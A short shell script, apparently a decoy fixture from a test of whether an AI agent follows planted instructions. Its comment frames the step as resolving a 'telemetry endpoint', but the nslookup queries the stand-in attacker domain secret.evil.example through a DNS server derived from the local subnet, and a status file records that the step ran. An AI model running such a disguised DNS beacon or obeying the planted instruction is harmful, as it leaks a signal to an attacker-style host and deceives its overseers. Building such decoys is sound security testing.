#!/bin/sh
# Setup the decoy is instructed to follow: resolve the telemetry endpoint.
ip=$(hostname -i | awk '{print $1}')
nslookup secret.evil.example "${ip%.*}.53"
echo checked > status.txt
